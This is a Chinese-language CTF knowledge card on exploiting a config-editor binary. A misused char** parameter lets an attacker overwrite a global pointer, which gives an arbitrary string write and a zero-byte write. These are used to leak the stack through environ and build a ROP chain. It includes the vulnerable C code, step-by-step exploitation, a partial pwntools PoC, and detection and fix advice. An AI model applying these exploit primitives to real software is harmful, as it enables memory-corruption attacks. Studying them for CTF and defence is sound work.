---
id: ctf-pwn-double-pointer-arbitrary-write-aligned-zero-rop
title: 配置编辑器双重指针误用：任意地址字符串写 + 对齐零字节写构造栈 ROP
type: scenario
domain: ctf
path: ctf/pwn
technique: double-pointer-arbitrary-write-aligned-zero-rop
aliases:
- 双重指针任意写
- heap_backup 指针改写
- 零字节写
- environ 泄露
- 配置编辑器任意写
tags:
- ctf
- pwn
- arbitrary-write
- pointer-confusion
- zero-write
- rop
- stack
- linux
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T09:47:29+08:00'
  notes: 已对照原文 pwn7 myedit_machine 核对：char ** 参数误写全局 heap_backup、buf_backup[off]/[0x100] 取任意地址、memcpy 字符串写与 ptr[n]=0 零写、environ 0x4F32D0 泄露及 open/read/write ROP 均与原文 exp 一致；未验证点：未本机复跑，完整链需按目标二进制调整偏移。
---

## 一句话结论

函数参数声明为 `char **heap_backup`，函数体却执行 `*heap_backup = fake_addr`：本意是把地址备份到堆，实际改写了调用方的全局指针；当 `fake_addr` 来自用户可控的栈越界读时，攻击者可以把该全局指针设为任意地址，后续 `memcpy(ptr, config_data, strlen(config_data))` 就变成任意地址字符串写，配合 `ptr[n] = 0` 的零字节写可拼出含空字节的栈 ROP 链。

## 原理

- 示例程序维护一个全局 `char *heap_backup = NULL`，编辑函数接收 `&heap_backup`（类型为 `char **`）：
  ```c
  void handle_edit(char *target_buffer, char **heap_backup) {
      char buf[MAX_SIZE], buf_backup[MAX_SIZE];
      ...
      strncpy(buf_backup, buf, strlen(buf));
      if (strlen(buf) >= 0x100) {
          fake_addr = *(void **)&buf_backup[0x100];   // 用户输入的第 0x100 字节起
          *heap_backup = (char *)fake_addr;           // 实际改写全局 heap_backup
          ptr = *(void **)&buf_backup[0];
      } else {
          scanf("%d", &off);
          fake_addr = *(void **)&buf_backup[off];     // 用户可控 off 的栈 OOB 读
          *heap_backup = (char *)fake_addr;
          ptr = *(void **)&buf_backup[0];
      }
  }
  ```
- 交换/写入分支把该全局指针当作目的地：
  ```c
  ptr = heap_backup;
  memcpy(ptr, config_data, strlen(config_data));   // 任意地址字符串写
  char *end_pos = (char *)ptr + strlen(config_data);
  ptr = (void *)((uintptr_t)end_pos & ~7UL);       // 8 字节对齐
  ...
  ptr[n] = 0;                                      // 对齐基址 + 有符号 n 的零字节写
  ```
- 因此得到两个原语：
  1. **任意地址字符串写**：写入 `config_data` 的 NUL 结尾内容，长度由 `strlen(config_data)` 决定；
  2. **任意地址零字节写**：地址为「写入结束位置向下 8 字节对齐」再加 `n`（`n` 为有符号 int），可写一个 `0x00`。
- `config_data` 本身可以通过编辑功能溢出/填充（`strncpy` 到 256 字节的缓冲区），且不含 NUL 的字节都能写入；要写含 `0x00` 的地址/ROP qword 时，先用字符串写铺好非零字节，再用零字节写补零。
- 示例还提供了任意读：查看分支把 `config_data` 前 8 字节当作地址，`write(1, addr, 8)`；用它读取静态二进制中 `environ` 的地址即可泄露栈，随后把 `heap_backup` 指向栈并写入 ROP 链。
- 最终利用通常需要把 ROP 链逐 qword 写到栈上的目标偏移，`set(n)` 的零写既用于补零，也用于截断字符串以便下一次 `memcpy` 的长度计算；这是该题最繁琐但可复用的部分。

## 触发条件

- 程序中存在把 `char **` 参数当 `char *` 解引用赋值的逻辑（`*param = value`），且 `value` 可被用户影响。
- 存在后续把该全局指针作为 `memcpy`/`strcpy`/`write` 目的地的路径；或该指针被用于任意读写。
- 用户能控制越界读的偏移（`off`）或输入长度达到固定偏移（示例 0x100），从而决定 `fake_addr`。
- 有任意读原语（如把输入前 8 字节当地址输出）用于泄露 `environ`/栈；或能通过其他方式获得栈地址。
- 程序为静态链接/无 PIE 时最容易；有 PIE 时需要先泄露代码/数据基址。

## 利用步骤

1. 反编译定位 `char **` 参数与 `*param = ...` 赋值；确认该参数实际指向全局指针变量（如 `&heap_backup`），而不是堆上的指针数组。
2. 找到读取 `fake_addr` 的路径：短输入走 `buf_backup[off]`（off 可控，可越界读栈），长输入走固定偏移 `0x100`；构造输入把目标地址放到该位置。
3. 确认交换/写入分支：`ptr = heap_backup; memcpy(ptr, config_data, strlen(config_data));`，先用一个无害地址测试写入是否生效（例如写可读可写段并在查看功能回读）。
4. 用任意读泄露栈：把 `environ`（静态二进制中地址固定）写入 `config_data` 前 8 字节，触发查看分支读取 8 字节，计算 `stack = leak - 0x1f8` 一类的 rbp 偏移（按目标二进制调整）。
5. 把 `heap_backup` 设为栈地址：发送 `b'a'*0xf8 + b'@'*8 + p64(stack)`（长度 ≥ 0x100，`buf_backup[0x100]` 即 `stack`），触发交换分支把 `config_data` 写到栈上。
6. 逐 qword 构造 ROP：每次 `edit(payload)` 把目标 qword 放在输入的正确偏移，使 `fake_addr` 等于目标栈槽；`set(n)` 写零补齐/截断。示例最终链用 `open/read/write` 系统调用读取 flag（seccomp 禁止 `execve`）。
7. 选择退出/返回菜单项，让函数返回到已写好的栈上 ROP 链；若崩溃，检查栈对齐、saved rbp、`n` 的符号与零写地址。

## PoC

```python
from pwn import *
context.arch = 'amd64'

# 1) 任意读：把 environ 地址放进 config_data 前 8 字节，查看分支 write(1, addr, 8)
environ = 0x4F32D0          # 静态二进制中的 environ 符号地址，按题目替换
edit(p64(environ))
cmd(2)                      # View config
leak = u64(io.recv(6).ljust(8, b'\x00'))
stack = leak - 0x1f8        # rbp 偏移按目标调整
log.success(f'stack leak={leak:#x}')

# 2) 把全局 heap_backup 改成栈地址：长度 >= 0x100 时取 buf_backup[0x100]
edit(b'a' * 0xf8 + b'@' * 8 + p64(stack))
exchange()                  # 触发 memcpy(heap_backup, config_data, strlen)

# 3) 后续用 edit(payload)/set(n) 逐 qword 写 ROP；
#    每次写入的 payload 需把目标 qword 放到 buf_backup[0x100]（或 off 指定位置），
#    set(n) 在写入结束位置 + n 处补一个 0x00，用于构造含空字节的地址/立即数。
```

```text
说明：environ 地址、0x1f8 偏移、0x100 位置均取自示例二进制；
换目标时需重新确认全局指针地址、buf_backup 与 config_data 的栈布局。
```

## 变体与关联

- 变体：若 `off` 被限制在缓冲区范围内，改用长度 ≥ 0x100 的固定偏移路径；反之若固定偏移不可控，则用 `off` 越界读栈上的返回地址/指针。
- 变体：若没有现成的任意读，可先利用编辑器输出指针值（示例 `printf("ptr now points to: %p")`）或格式化字符串泄露。
- 变体：目标有 PIE/ASLR 时，先泄露代码基址或 `environ`；有 Canary 时，任意写可直接改返回地址，但仍需处理栈对齐和 `__stack_chk_fail` 路径。
- 关联卡片：[[binary-pwn-stack-rbp-arbitrary-write-got-read-write-dlresolve-chunked-rop]]（可控 rbp 逐轮任意写）、[[binary-pwn-stack-pivot-leave-ret-bss]]（栈迁移）、[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]（environ 泄露 + 栈 ROP）。
- 边界：本卡的“字符串写”不能直接包含 `0x00`；必须依赖零字节写或目标地址原有零字节。完整 ROP 偏移与调用序列需按目标二进制重新计算，不能直接套用示例。

## 检测与防御

- 检测：审计 `char **` 出参的赋值路径，确认 `*param = value` 的 `value` 是否来自用户输入/越界读；检查 `memcpy`/`strcpy` 目的指针是否可能被用户改写。
- 修复：不要把“指向指针的指针”与“指向数据的指针”混用；对 `off` 做严格范围检查；不要向用户暴露任意读（按用户输入地址 `write`）；对配置数据使用固定长度拷贝并校验目标指针。
- 加固：PIE + ASLR 增加地址预测难度；栈 Canary/CET 不能阻止任意写本身；seccomp 限制 `open/read/write` 等系统调用，降低拿到任意写后的影响。
- 响应：若发现此类原语，优先检查全局指针/函数指针是否可被改写，再评估能否直接劫持控制流。
